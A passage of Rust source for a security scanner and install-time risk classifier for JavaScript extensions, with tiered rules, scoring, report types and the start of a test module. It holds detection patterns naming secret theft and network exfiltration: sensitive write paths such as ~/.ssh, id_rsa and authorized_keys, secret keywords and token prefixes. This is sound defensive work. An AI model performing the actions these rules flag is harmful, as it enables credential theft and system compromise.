    pub extension_id: String,
    /// Overall risk tier (worst finding).
    pub overall_tier: RiskTier,
    /// Counts per tier.
    pub tier_counts: SecurityTierCounts,
    /// Individual findings sorted by tier (worst first).
    pub findings: Vec<SecurityFinding>,
    /// Human-readable one-line verdict.
    pub verdict: String,
    /// Rulebook version that produced this report.
    pub rulebook_version: String,
}

/// Counts by risk tier.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct SecurityTierCounts {
    pub critical: usize,
    pub high: usize,
    pub medium: usize,
    pub low: usize,
}

/// Current rulebook version. Bump when rules are added or changed.
/// v2.0.0: Added 9 rules (SEC-SPAWN-001, SEC-CONSTRUCTOR-001, SEC-NATIVEMOD-001,
///   SEC-GLOBAL-001, SEC-SYMLINK-001, SEC-CHMOD-001, SEC-SOCKET-001,
///   SEC-WASM-001, SEC-ARGUMENTS-001). Stabilized deterministic sort order.
pub const SECURITY_RULEBOOK_VERSION: &str = "2.0.0";

impl SecurityScanReport {
    /// Build from a list of findings.
    ///
    /// Findings are sorted deterministically: first by risk tier (Critical
    /// first), then by file path, then by line number, then by rule ID name.
    /// This guarantees identical output for identical input regardless of
    /// scan traversal order.
    #[must_use]
    pub fn from_findings(extension_id: String, mut findings: Vec<SecurityFinding>) -> Self {
        // Deterministic sort: tier → file → line → column → rule name.
        findings.sort_by(|a, b| {
            a.risk_tier
                .cmp(&b.risk_tier)
                .then_with(|| a.file.as_deref().unwrap_or("").cmp(b.file.as_deref().unwrap_or("")))
                .then_with(|| a.line.cmp(&b.line))
                .then_with(|| a.column.cmp(&b.column))
                .then_with(|| a.rule_id.name().cmp(b.rule_id.name()))
        });

        let mut counts = SecurityTierCounts::default();
        for f in &findings {
            match f.risk_tier {
                RiskTier::Critical => counts.critical += 1,
                RiskTier::High => counts.high += 1,
                RiskTier::Medium => counts.medium += 1,
                RiskTier::Low => counts.low += 1,
            }
        }

        let overall_tier = findings
            .first()
            .map_or(RiskTier::Low, |f| f.risk_tier);

        let verdict = match overall_tier {
            RiskTier::Critical => format!(
                "BLOCK: {} critical finding(s) — active exploit vectors detected",
                counts.critical
            ),
            RiskTier::High => format!(
                "REVIEW REQUIRED: {} high-risk finding(s) — likely dangerous patterns",
                counts.high
            ),
            RiskTier::Medium => format!(
                "CAUTION: {} medium-risk finding(s) — warrants review",
                counts.medium
            ),
            RiskTier::Low if findings.is_empty() => "CLEAN: no security findings".to_string(),
            RiskTier::Low => format!(
                "INFO: {} low-risk finding(s) — informational",
                counts.low
            ),
        };

        Self {
            schema: SECURITY_SCAN_SCHEMA.to_string(),
            extension_id,
            overall_tier,
            tier_counts: counts,
            findings,
            verdict,
            rulebook_version: SECURITY_RULEBOOK_VERSION.to_string(),
        }
    }

    /// Serialize to pretty JSON.
    ///
    /// # Errors
    ///
    /// Returns an error if serialization fails.
    pub fn to_json(&self) -> Result<String, serde_json::Error> {
        serde_json::to_string_pretty(self)
    }

    /// Whether the report recommends blocking the extension.
    #[must_use]
    pub const fn should_block(&self) -> bool {
        matches!(self.overall_tier, RiskTier::Critical)
    }

    /// Whether the report recommends manual review.
    #[must_use]
    pub const fn needs_review(&self) -> bool {
        matches!(self.overall_tier, RiskTier::Critical | RiskTier::High)
    }
}

// ============================================================================
// Evidence ledger for correlation with runtime behavior
// ============================================================================

/// Schema version for the security evidence ledger.
pub const SECURITY_EVIDENCE_LEDGER_SCHEMA: &str = "pi.ext.security_evidence_ledger.v1";

/// A single evidence entry for the security ledger. Designed for JSONL
/// serialization so it can be correlated with runtime hostcall telemetry.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SecurityEvidenceLedgerEntry {
    pub schema: String,
    /// Monotonic entry index within this scan.
    pub entry_index: usize,
    /// Extension identifier.
    pub extension_id: String,
    /// Rule ID that fired.
    pub rule_id: SecurityRuleId,
    /// Risk tier.
    pub risk_tier: RiskTier,
    /// Human-readable rationale.
    pub rationale: String,
    /// Source file (relative).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub file: Option<String>,
    /// 1-based line.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub line: Option<usize>,
    /// 1-based column.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub column: Option<usize>,
    /// Rulebook version.
    pub rulebook_version: String,
}

impl SecurityEvidenceLedgerEntry {
    /// Convert a `SecurityFinding` into a ledger entry.
    #[must_use]
    pub fn from_finding(
        entry_index: usize,
        extension_id: &str,
        finding: &SecurityFinding,
    ) -> Self {
        Self {
            schema: SECURITY_EVIDENCE_LEDGER_SCHEMA.to_string(),
            entry_index,
            extension_id: extension_id.to_string(),
            rule_id: finding.rule_id,
            risk_tier: finding.risk_tier,
            rationale: finding.rationale.clone(),
            file: finding.file.clone(),
            line: finding.line,
            column: finding.column,
            rulebook_version: SECURITY_RULEBOOK_VERSION.to_string(),
        }
    }
}

/// Produce a JSONL evidence ledger from a security scan report.
///
/// # Errors
///
/// Returns an error if serialization of any entry fails.
pub fn security_evidence_ledger_jsonl(
    report: &SecurityScanReport,
) -> Result<String, serde_json::Error> {
    let mut out = String::new();
    for (i, finding) in report.findings.iter().enumerate() {
        let entry =
            SecurityEvidenceLedgerEntry::from_finding(i, &report.extension_id, finding);
        if i > 0 {
            out.push('\n');
        }
        out.push_str(&serde_json::to_string(&entry)?);
    }
    Ok(out)
}

// ============================================================================
// Security scanner implementation
// ============================================================================

/// Scans extension source for security-sensitive patterns and produces a
/// deterministic risk classification report.
pub struct SecurityScanner;

impl SecurityScanner {
    /// Scan raw source text and produce a security scan report.
    #[must_use]
    pub fn scan_source(extension_id: &str, source: &str) -> SecurityScanReport {
        let mut findings = Vec::new();

        for (idx, line) in source.lines().enumerate() {
            let line_no = idx + 1;
            let trimmed = line.trim();

            // Skip empty lines and full-line comments.
            if trimmed.is_empty()
                || trimmed.starts_with("//")
                || trimmed.starts_with('*')
                || trimmed.starts_with("/*")
            {
                continue;
            }

            Self::scan_line(trimmed, line_no, &mut findings);
        }

        SecurityScanReport::from_findings(extension_id.to_string(), findings)
    }

    /// Scan extension files under a directory.
    pub fn scan_path(
        extension_id: &str,
        path: &Path,
        root: &Path,
    ) -> SecurityScanReport {
        let files = collect_scannable_files(path);
        let mut findings = Vec::new();

        for file_path in &files {
            let Ok(content) = std::fs::read_to_string(file_path) else {
                continue;
            };
            let rel = relative_posix_path(root, file_path);
            let mut in_block_comment = false;

            for (idx, raw_line) in content.lines().enumerate() {
                let line_no = idx + 1;

                // Track block comments.
                let line = strip_block_comment_tracking(raw_line, &mut in_block_comment);
                let trimmed = line.trim();

                if trimmed.is_empty()
                    || trimmed.starts_with("//")
                    || trimmed.starts_with('*')
                {
                    continue;
                }

                Self::scan_line_with_file(trimmed, line_no, &rel, &mut findings);
            }
        }

        SecurityScanReport::from_findings(extension_id.to_string(), findings)
    }

    fn scan_line(text: &str, line_no: usize, findings: &mut Vec<SecurityFinding>) {
        Self::scan_line_with_file(text, line_no, "", findings);
    }

    #[allow(clippy::too_many_lines)]
    fn scan_line_with_file(
        text: &str,
        line_no: usize,
        file: &str,
        findings: &mut Vec<SecurityFinding>,
    ) {
        let file_opt = if file.is_empty() {
            None
        } else {
            Some(file.to_string())
        };

        // ---- Critical tier ----

        // SEC-EVAL-001: eval() usage (not in string or property name).
        if contains_eval_call(text) {
            findings.push(SecurityFinding {
                rule_id: SecurityRuleId::EvalUsage,
                risk_tier: RiskTier::Critical,
                rationale: "eval() enables arbitrary code execution at runtime".to_string(),
                file: file_opt.clone(),
                line: Some(line_no),
                column: text.find("eval(").map(|c| c + 1),
                snippet: Some(truncate_snippet(text)),
            });
        }

        // SEC-FUNC-001: new Function(...).
        if text.contains("new Function") && !text.contains("new Function()") {
            findings.push(SecurityFinding {
                rule_id: SecurityRuleId::NewFunctionUsage,
                risk_tier: RiskTier::Critical,
                rationale: "new Function() creates code from strings, enabling injection"
                    .to_string(),
                file: file_opt.clone(),
                line: Some(line_no),
                column: text.find("new Function").map(|c| c + 1),
                snippet: Some(truncate_snippet(text)),
            });
        }

        // SEC-BIND-001: process.binding().
        if text.contains("process.binding") {
            findings.push(SecurityFinding {
                rule_id: SecurityRuleId::ProcessBinding,
                risk_tier: RiskTier::Critical,
                rationale: "process.binding() accesses internal Node.js C++ bindings"
                    .to_string(),
                file: file_opt.clone(),
                line: Some(line_no),
                column: text.find("process.binding").map(|c| c + 1),
                snippet: Some(truncate_snippet(text)),
            });
        }

        // SEC-DLOPEN-001: process.dlopen().
        if text.contains("process.dlopen") {
            findings.push(SecurityFinding {
                rule_id: SecurityRuleId::ProcessDlopen,
                risk_tier: RiskTier::Critical,
                rationale: "process.dlopen() loads native addons, bypassing sandbox"
                    .to_string(),
                file: file_opt.clone(),
                line: Some(line_no),
                column: text.find("process.dlopen").map(|c| c + 1),
                snippet: Some(truncate_snippet(text)),
            });
        }

        // SEC-PROTO-001: __proto__ assignment.
        if text.contains("__proto__") || text.contains("Object.setPrototypeOf") {
            findings.push(SecurityFinding {
                rule_id: SecurityRuleId::ProtoPollution,
                risk_tier: RiskTier::Critical,
                rationale: "Prototype manipulation can pollute shared object chains"
                    .to_string(),
                file: file_opt.clone(),
                line: Some(line_no),
                column: text
                    .find("__proto__")
                    .or_else(|| text.find("Object.setPrototypeOf"))
                    .map(|c| c + 1),
                snippet: Some(truncate_snippet(text)),
            });
        }

        // SEC-RCACHE-001: require.cache manipulation.
        if text.contains("require.cache") {
            findings.push(SecurityFinding {
                rule_id: SecurityRuleId::RequireCacheManip,
                risk_tier: RiskTier::Critical,
                rationale:
                    "require.cache manipulation can hijack module resolution".to_string(),
                file: file_opt.clone(),
                line: Some(line_no),
                column: text.find("require.cache").map(|c| c + 1),
                snippet: Some(truncate_snippet(text)),
            });
        }

        // ---- High tier ----

        // SEC-SECRET-001: hardcoded secrets.
        if contains_hardcoded_secret(text) {
            findings.push(SecurityFinding {
                rule_id: SecurityRuleId::HardcodedSecret,
                risk_tier: RiskTier::High,
                rationale: "Potential hardcoded secret or API key detected".to_string(),
                file: file_opt.clone(),
                line: Some(line_no),
                column: None,
                snippet: Some(truncate_snippet(text)),
            });
        }

        // SEC-DIMPORT-001: dynamic import().
        if contains_dynamic_import(text) {
            findings.push(SecurityFinding {
                rule_id: SecurityRuleId::DynamicImport,
                risk_tier: RiskTier::High,
                rationale: "Dynamic import() can load arbitrary modules at runtime"
                    .to_string(),
                file: file_opt.clone(),
                line: Some(line_no),
                column: text.find("import(").map(|c| c + 1),
                snippet: Some(truncate_snippet(text)),
            });
        }

        // SEC-DEFPROP-001: Object.defineProperty on global/prototype.
        if text.contains("Object.defineProperty")
            && (text.contains("globalThis")
                || text.contains("global.")
                || text.contains("prototype"))
        {
            findings.push(SecurityFinding {
                rule_id: SecurityRuleId::DefinePropertyAbuse,
                risk_tier: RiskTier::High,
                rationale:
                    "Object.defineProperty on global/prototype can intercept operations"
                        .to_string(),
                file: file_opt.clone(),
                line: Some(line_no),
                column: text.find("Object.defineProperty").map(|c| c + 1),
                snippet: Some(truncate_snippet(text)),
            });
        }

        // SEC-EXFIL-001: Network exfiltration patterns.
        if contains_exfiltration_pattern(text) {
            findings.push(SecurityFinding {
                rule_id: SecurityRuleId::NetworkExfiltration,
                risk_tier: RiskTier::High,
                rationale: "Potential data exfiltration via constructed network request"
                    .to_string(),
                file: file_opt.clone(),
                line: Some(line_no),
                column: None,
                snippet: Some(truncate_snippet(text)),
            });
        }

        // SEC-FSSENS-001: Writes to sensitive paths.
        if contains_sensitive_path_write(text) {
            findings.push(SecurityFinding {
                rule_id: SecurityRuleId::SensitivePathWrite,
                risk_tier: RiskTier::High,
                rationale: "Write to security-sensitive filesystem path detected"
                    .to_string(),
                file: file_opt.clone(),
                line: Some(line_no),
                column: None,
                snippet: Some(truncate_snippet(text)),
            });
        }

        // ---- Medium tier ----

        // SEC-ENV-001: process.env access.
        if text.contains("process.env") {
            findings.push(SecurityFinding {
                rule_id: SecurityRuleId::ProcessEnvAccess,
                risk_tier: RiskTier::Medium,
                rationale: "process.env access may expose secrets or configuration"
                    .to_string(),
                file: file_opt.clone(),
                line: Some(line_no),
                column: text.find("process.env").map(|c| c + 1),
                snippet: Some(truncate_snippet(text)),
            });
        }

        // SEC-TIMER-001: Timer abuse (very short intervals).
        if contains_timer_abuse(text) {
            findings.push(SecurityFinding {
                rule_id: SecurityRuleId::TimerAbuse,
                risk_tier: RiskTier::Medium,
                rationale: "Very short timer interval may indicate resource abuse"
                    .to_string(),
                file: file_opt.clone(),
                line: Some(line_no),
                column: None,
                snippet: Some(truncate_snippet(text)),
            });
        }

        // SEC-PROXY-001: Proxy/Reflect usage.
        if text.contains("new Proxy") || text.contains("Reflect.") {
            findings.push(SecurityFinding {
                rule_id: SecurityRuleId::ProxyReflect,
                risk_tier: RiskTier::Medium,
                rationale:
                    "Proxy/Reflect can intercept and modify object operations transparently"
                        .to_string(),
                file: file_opt.clone(),
                line: Some(line_no),
                column: text
                    .find("new Proxy")
                    .or_else(|| text.find("Reflect."))
                    .map(|c| c + 1),
                snippet: Some(truncate_snippet(text)),
            });
        }

        // SEC-WITH-001: with statement.
        if contains_with_statement(text) {
            findings.push(SecurityFinding {
                rule_id: SecurityRuleId::WithStatement,
                risk_tier: RiskTier::Medium,
                rationale:
                    "with statement modifies scope chain, making variable resolution unpredictable"
                        .to_string(),
                file: file_opt.clone(),
                line: Some(line_no),
                column: text.find("with").map(|c| c + 1),
                snippet: Some(truncate_snippet(text)),
            });
        }

        // ---- Low tier ----

        // SEC-DEBUG-001: debugger statement.
        if text.contains("debugger") && is_debugger_statement(text) {
            findings.push(SecurityFinding {
                rule_id: SecurityRuleId::DebuggerStatement,
                risk_tier: RiskTier::Low,
                rationale: "debugger statement left in production code".to_string(),
                file: file_opt.clone(),
                line: Some(line_no),
                column: text.find("debugger").map(|c| c + 1),
                snippet: Some(truncate_snippet(text)),
            });
        }

        // SEC-CONSOLE-001: console.error/warn with interpolated values.
        if contains_console_info_leak(text) {
            findings.push(SecurityFinding {
                rule_id: SecurityRuleId::ConsoleInfoLeak,
                risk_tier: RiskTier::Low,
                rationale: "Console output may leak sensitive information".to_string(),
                file: file_opt,
                line: Some(line_no),
                column: text.find("console.").map(|c| c + 1),
                snippet: Some(truncate_snippet(text)),
            });
        }
    }
}

// ============================================================================
// Pattern detection helpers
// ============================================================================

/// Check for `eval(...)` that isn't in a property name or string context.
fn contains_eval_call(text: &str) -> bool {
    let mut search = text;
    while let Some(pos) = search.find("eval(") {
        // Not preceded by a dot (method call on object) or letter (part of
        // another identifier like `retrieval`).
        if pos == 0 || !text.as_bytes()[pos - 1].is_ascii_alphanumeric() && text.as_bytes()[pos - 1] != b'.' {
            return true;
        }
        search = &search[pos + 5..];
    }
    false
}

/// Check for dynamic `import(...)` — not static `import ... from`.
fn contains_dynamic_import(text: &str) -> bool {
    let trimmed = text.trim();
    // Static import statements start with `import` at the beginning.
    if trimmed.starts_with("import ") || trimmed.starts_with("import{") {
        return false;
    }
    text.contains("import(")
}

/// Detect hardcoded secret patterns: API keys, tokens, passwords.
fn contains_hardcoded_secret(text: &str) -> bool {
    let lower = text.to_ascii_lowercase();
    // Look for assignment patterns with secret-like names.
    let secret_keywords = [
        "api_key", "apikey", "api-key",
        "secret_key", "secretkey", "secret-key",
        "password", "passwd",
        "access_token", "accesstoken",
        "private_key", "privatekey",
        "auth_token", "authtoken",
    ];

    for kw in &secret_keywords {
        if let Some(kw_pos) = lower.find(kw) {
            // Check if followed by assignment with a string literal.
            let rest = &text[kw_pos + kw.len()..];
            let rest_trimmed = rest.trim_start();
            if (rest_trimmed.starts_with("=\"")
                || rest_trimmed.starts_with("= \"")
                || rest_trimmed.starts_with("='")
                || rest_trimmed.starts_with("= '")
                || rest_trimmed.starts_with(": \"")
                || rest_trimmed.starts_with(":\"")
                || rest_trimmed.starts_with(": '")
                || rest_trimmed.starts_with(":'"))
                // Ignore env lookups: process.env.API_KEY
                && !lower[..kw_pos].ends_with("process.env.")
                && !lower[..kw_pos].ends_with("env.")
                // Ignore empty strings.
                && !rest_trimmed.starts_with("=\"\"")
                && !rest_trimmed.starts_with("= \"\"")
                && !rest_trimmed.starts_with("=''")
                && !rest_trimmed.starts_with("= ''")
            {
                return true;
            }
        }
    }

    // Also detect common token prefixes (sk-ant-, ghp_, etc.) assigned as literals.
    let token_prefixes = ["sk-ant-", "sk-", "ghp_", "gho_", "glpat-", "xoxb-", "xoxp-"];
    for pfx in &token_prefixes {
        if text.contains(&format!("\"{pfx}")) || text.contains(&format!("'{pfx}")) {
            return true;
        }
    }

    false
}

/// Detect network exfiltration: fetch/XMLHttpRequest with template literals
/// or concatenated URLs (not simple static URLs).
fn contains_exfiltration_pattern(text: &str) -> bool {
    let has_network_call = text.contains("fetch(") || text.contains("XMLHttpRequest");
    if !has_network_call {
        return false;
    }
    // Suspicious if URL is constructed from variables (template literal or concat).
    text.contains("fetch(`") || text.contains("fetch(\"http\" +") || text.contains("fetch(url")
}

/// Detect writes to sensitive filesystem paths.
fn contains_sensitive_path_write(text: &str) -> bool {
    let has_write = text.contains("writeFileSync")
        || text.contains("writeFile(")
        || text.contains("fs.write")
        || text.contains("appendFileSync")
        || text.contains("appendFile(");
    if !has_write {
        return false;
    }
    let sensitive_paths = [
        "/etc/", "/root/", "~/.ssh", "~/.bashrc", "~/.profile",
        "~/.zshrc", "/usr/", "/var/", ".env", "id_rsa", "authorized_keys",
    ];
    sensitive_paths.iter().any(|p| text.contains(p))
}

/// Detect very short timer intervals (< 10ms).
fn contains_timer_abuse(text: &str) -> bool {
    if !text.contains("setInterval") {
        return false;
    }
    // Look for setInterval(..., N) where N < 10.
    if let Some(pos) = text.rfind(", ") {
        let rest = text[pos + 2..].trim_end_matches(')').trim();
        if let Ok(ms) = rest.parse::<u64>() {
            return ms < 10;
        }
    }
    false
}

/// Detect `with (...)` statement — not `width` or `without`.
fn contains_with_statement(text: &str) -> bool {
    let trimmed = text.trim();
    // `with` as a statement: `with (` at statement position.
    if trimmed.starts_with("with (") || trimmed.starts_with("with(") {
        return true;
    }
    // Also catch `} with (` for inline blocks.
    if let Some(pos) = text.find("with") {
        if pos > 0 {
            let before = text[..pos].trim_end();
            let after = text[pos + 4..].trim_start();
            if (before.ends_with('{') || before.ends_with('}') || before.ends_with(';'))
                && after.starts_with('(')
            {
                return true;
            }
        }
    }
    false
}

/// Detect `debugger;` as a standalone statement.
fn is_debugger_statement(text: &str) -> bool {
    let trimmed = text.trim();
    trimmed == "debugger;" || trimmed == "debugger" || trimmed.starts_with("debugger;")
}

/// Detect console.error/warn/log with interpolated values (not just strings).
fn contains_console_info_leak(text: &str) -> bool {
    // Only flag console.error/warn which more likely leak sensitive data.
    if !text.contains("console.error") && !text.contains("console.warn") {
        return false;
    }
    // Flag if there's variable interpolation or multiple args.
    text.contains("console.error(") || text.contains("console.warn(")
}

/// Truncate a source snippet to a reasonable display length.
fn truncate_snippet(text: &str) -> String {
    const MAX_SNIPPET_LEN: usize = 200;
    if text.len() <= MAX_SNIPPET_LEN {
        text.to_string()
    } else {
        format!("{}...", &text[..MAX_SNIPPET_LEN])
    }
}

/// Collect JS/TS files from a path (file or directory).
fn collect_scannable_files(path: &Path) -> Vec<std::path::PathBuf> {
    if path.is_file() {
        return vec![path.to_path_buf()];
    }
    let mut files = Vec::new();
    if let Ok(entries) = std::fs::read_dir(path) {
        for entry in entries.flatten() {
            let p = entry.path();
            if p.is_dir() {
                // Skip node_modules and hidden dirs.
                let name = p.file_name().and_then(|n| n.to_str()).unwrap_or("");
                if name == "node_modules" || name.starts_with('.') {
                    continue;
                }
                files.extend(collect_scannable_files(&p));
            } else if p.is_file() {
                if let Some(ext) = p.extension().and_then(|e| e.to_str()) {
                    if matches!(ext, "js" | "ts" | "mjs" | "mts" | "cjs" | "cts" | "jsx" | "tsx") {
                        files.push(p);
                    }
                }
            }
        }
    }
    files.sort();
    files
}

/// Compute relative POSIX path from root to path.
fn relative_posix_path(root: &Path, path: &Path) -> String {
    path.strip_prefix(root)
        .unwrap_or(path)
        .to_string_lossy()
        .replace('\\', "/")
}

/// Strip block comments for security scanning. Simpler than the full
/// compat scanner's `strip_js_comments` — we only need to track the
/// block comment state to avoid false positives.
fn strip_block_comment_tracking(line: &str, in_block: &mut bool) -> String {
    let mut result = String::with_capacity(line.len());
    let bytes = line.as_bytes();
    let mut i = 0;

    while i < bytes.len() {
        if *in_block {
            if i + 1 < bytes.len() && bytes[i] == b'*' && bytes[i + 1] == b'/' {
                *in_block = false;
                i += 2;
            } else {
                i += 1;
            }
        } else if i + 1 < bytes.len() && bytes[i] == b'/' && bytes[i + 1] == b'*' {
            *in_block = true;
            i += 2;
        } else if i + 1 < bytes.len() && bytes[i] == b'/' && bytes[i + 1] == b'/' {
            // Rest of line is comment.
            break;
        } else {
            result.push(bytes[i] as char);
            i += 1;
        }
    }

    result
}

// ============================================================================
// Install-time composite risk classifier (bd-21vng, SEC-2.3)
// ============================================================================

/// Schema version for the install-time risk classification report.
pub const INSTALL_TIME_RISK_SCHEMA: &str = "pi.ext.install_risk.v1";

/// Install-time recommendation.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum InstallRecommendation {
    /// Safe to install and load without further review.
    Allow,
    /// Install but flag for operator review before first run.
    Review,
    /// Block installation; active exploit vectors detected.
    Block,
}

impl fmt::Display for InstallRecommendation {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::Allow => f.write_str("ALLOW"),
            Self::Review => f.write_str("REVIEW"),
            Self::Block => f.write_str("BLOCK"),
        }
    }
}

/// Composite install-time risk classification report that synthesizes signals
/// from both the compatibility preflight and the security scanner into a
/// single deterministic verdict.
///
/// The classification algorithm is purely functional: given the same
/// `PreflightReport` and `SecurityScanReport`, it always produces the
/// identical `InstallTimeRiskReport`. No randomness, no side effects.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct InstallTimeRiskReport {
    /// Schema version.
    pub schema: String,
    /// Extension identifier.
    pub extension_id: String,
    /// Composite risk tier (worst-of across both reports).
    pub composite_risk_tier: RiskTier,
    /// Composite risk score (0 = maximum risk, 100 = clean).
    pub composite_risk_score: u8,
    /// Install recommendation derived from composite analysis.
    pub recommendation: InstallRecommendation,
    /// Human-readable one-line verdict.
    pub verdict: String,
    /// Compatibility preflight summary.
    pub preflight_summary: PreflightSummaryBrief,
    /// Security scan summary.
    pub security_summary: SecuritySummaryBrief,
    /// Rulebook version that produced the security findings.
    pub rulebook_version: String,
}

/// Abbreviated preflight summary for embedding in the composite report.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PreflightSummaryBrief {
    pub verdict: PreflightVerdict,
    pub confidence: u8,
    pub errors: usize,
    pub warnings: usize,
}

/// Abbreviated security summary for embedding in the composite report.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SecuritySummaryBrief {
    pub overall_tier: RiskTier,
    pub critical: usize,
    pub high: usize,
    pub medium: usize,
    pub low: usize,
    pub total_findings: usize,
}

impl InstallTimeRiskReport {
    /// Build from a preflight report and a security scan report.
    ///
    /// The composite risk tier is the worst (lowest ordinal) tier from either
    /// report. The composite score is a weighted combination of the preflight
    /// confidence and the security finding severity.
    ///
    /// This function is pure and deterministic.
    #[must_use]
    pub fn classify(
        extension_id: &str,
        preflight: &PreflightReport,
        security: &SecurityScanReport,
    ) -> Self {
        let preflight_summary = PreflightSummaryBrief {
            verdict: preflight.verdict,
            confidence: preflight.confidence.value(),
            errors: preflight.summary.errors,
            warnings: preflight.summary.warnings,
        };

        let security_summary = SecuritySummaryBrief {
            overall_tier: security.overall_tier,
            critical: security.tier_counts.critical,
            high: security.tier_counts.high,
            medium: security.tier_counts.medium,
            low: security.tier_counts.low,
            total_findings: security.findings.len(),
        };

        // Composite risk tier: worst-of across both reports.
        // Map preflight verdict to a risk tier for comparison.
        let preflight_risk = match preflight.verdict {
            PreflightVerdict::Fail => RiskTier::High,
            PreflightVerdict::Warn => RiskTier::Medium,
            PreflightVerdict::Pass => RiskTier::Low,
        };
        let composite_risk_tier = preflight_risk.min(security.overall_tier);

        // Composite risk score: 0 = maximum risk, 100 = clean.
        // Start from 100 and apply deductions.
        let security_deduction = security.tier_counts.critical.saturating_mul(30)
            + security.tier_counts.high.saturating_mul(20)
            + security.tier_counts.medium.saturating_mul(10)
            + security.tier_counts.low.saturating_mul(3);
        let preflight_deduction =
            preflight.summary.errors.saturating_mul(15)
            + preflight.summary.warnings.saturating_mul(5);
        let total_deduction = security_deduction + preflight_deduction;
        let composite_risk_score =
            u8::try_from(100_usize.saturating_sub(total_deduction).min(100)).unwrap_or(0);

        // Recommendation: deterministic decision tree.
        let recommendation = match composite_risk_tier {
            RiskTier::Critical => InstallRecommendation::Block,
            RiskTier::High => InstallRecommendation::Review,
            RiskTier::Medium => {
                if composite_risk_score < 50 {
                    InstallRecommendation::Review
                } else {
                    InstallRecommendation::Allow
                }
            }
            RiskTier::Low => InstallRecommendation::Allow,
        };

        let verdict = Self::format_verdict(
            recommendation,
            &preflight_summary,
            &security_summary,
            composite_risk_score,
        );

        Self {
            schema: INSTALL_TIME_RISK_SCHEMA.to_string(),
            extension_id: extension_id.to_string(),
            composite_risk_tier,
            composite_risk_score,
            recommendation,
            verdict,
            preflight_summary,
            security_summary,
            rulebook_version: SECURITY_RULEBOOK_VERSION.to_string(),
        }
    }

    fn format_verdict(
        recommendation: InstallRecommendation,
        preflight: &PreflightSummaryBrief,
        security: &SecuritySummaryBrief,
        score: u8,
    ) -> String {
        let sec_part = if security.total_findings == 0 {
            "no security findings".to_string()
        } else {
            let mut parts = Vec::new();
            if security.critical > 0 {
                parts.push(format!("{} critical", security.critical));
            }
            if security.high > 0 {
                parts.push(format!("{} high", security.high));
            }
            if security.medium > 0 {
                parts.push(format!("{} medium", security.medium));
            }
            if security.low > 0 {
                parts.push(format!("{} low", security.low));
            }
            parts.join(", ")
        };

        let compat_part = match preflight.verdict {
            PreflightVerdict::Pass => "compatible".to_string(),
            PreflightVerdict::Warn => format!(
                "{} compat warning(s)",
                preflight.warnings
            ),
            PreflightVerdict::Fail => format!(
                "{} compat error(s)",
                preflight.errors
            ),
        };

        format!(
            "{recommendation}: score {score}/100 — {sec_part}; {compat_part}"
        )
    }

    /// Serialize to pretty JSON.
    ///
    /// # Errors
    ///
    /// Returns an error if serialization fails.
    pub fn to_json(&self) -> Result<String, serde_json::Error> {
        serde_json::to_string_pretty(self)
    }

    /// Whether installation should be blocked.
    #[must_use]
    pub const fn should_block(&self) -> bool {
        matches!(self.recommendation, InstallRecommendation::Block)
    }

    /// Whether manual review is recommended before first run.
    #[must_use]
    pub const fn needs_review(&self) -> bool {
        matches!(
            self.recommendation,
            InstallRecommendation::Block | InstallRecommendation::Review
        )
    }
}

/// Convenience function: run both the preflight analyzer and security scanner
/// on raw source text and produce a composite install-time risk report.
///
/// This is the primary entry point for install-time risk classification.
#[must_use]
pub fn classify_extension_source(
    extension_id: &str,
    source: &str,
    policy: &ExtensionPolicy,
) -> InstallTimeRiskReport {
    let analyzer = PreflightAnalyzer::new(policy, Some(extension_id));
    let preflight = analyzer.analyze_source(extension_id, source);
    let security = SecurityScanner::scan_source(extension_id, source);
    InstallTimeRiskReport::classify(extension_id, &preflight, &security)
}

/// Run both the preflight analyzer and security scanner on extension files
/// at a given path and produce a composite install-time risk report.
pub fn classify_extension_path(
    extension_id: &str,
    path: &Path,
    policy: &ExtensionPolicy,
) -> InstallTimeRiskReport {
    let analyzer = PreflightAnalyzer::new(policy, Some(extension_id));
    let preflight = analyzer.analyze(path);
    let security = SecurityScanner::scan_path(extension_id, path, path);
    InstallTimeRiskReport::classify(extension_id, &preflight, &security)
}

// ============================================================================
// Tests
// ============================================================================

#[cfg(test)]
mod tests {
    use super::*;
    use crate::extensions::ExtensionPolicy;

    // ---- ModuleSupport ----

    #[test]
    fn module_support_severity_mapping() {
        assert_eq!(ModuleSupport::Real.severity(), FindingSeverity::Info);
        assert_eq!(ModuleSupport::Partial.severity(), FindingSeverity::Warning);
        assert_eq!(ModuleSupport::Stub.severity(), FindingSeverity::Warning);
        assert_eq!(ModuleSupport::ErrorThrow.severity(), FindingSeverity::Error);
        assert_eq!(ModuleSupport::Missing.severity(), FindingSeverity::Error);
    }

    #[test]
    fn module_support_display() {
        assert_eq!(format!("{}", ModuleSupport::Real), "fully supported");
        assert_eq!(format!("{}", ModuleSupport::Missing), "not available");
    }

    #[test]
    fn module_support_serde_roundtrip() {
        for variant in [
            ModuleSupport::Real,
            ModuleSupport::Partial,
            ModuleSupport::Stub,
            ModuleSupport::ErrorThrow,
            ModuleSupport::Missing,
        ] {
            let json = serde_json::to_string(&variant).unwrap();
            let back: ModuleSupport = serde_json::from_str(&json).unwrap();
            assert_eq!(variant, back);
        }
    }

    // ---- FindingSeverity ordering ----

    #[test]
    fn severity_ordering() {
        assert!(FindingSeverity::Info < FindingSeverity::Warning);
        assert!(FindingSeverity::Warning < FindingSeverity::Error);
    }

    // ---- known_module_support ----

    #[test]
    fn known_modules_p0_are_real() {
        assert_eq!(known_module_support("path"), Some(ModuleSupport::Real));
        assert_eq!(known_module_support("node:path"), Some(ModuleSupport::Real));
        assert_eq!(known_module_support("os"), Some(ModuleSupport::Real));
        assert_eq!(known_module_support("node:os"), Some(ModuleSupport::Real));
        assert_eq!(known_module_support("fs"), Some(ModuleSupport::Real));
        assert_eq!(known_module_support("node:fs"), Some(ModuleSupport::Real));
        assert_eq!(
            known_module_support("child_process"),
            Some(ModuleSupport::Real)
        );
    }

    #[test]
    fn known_modules_fs_promises_partial() {
        assert_eq!(
            known_module_support("node:fs/promises"),
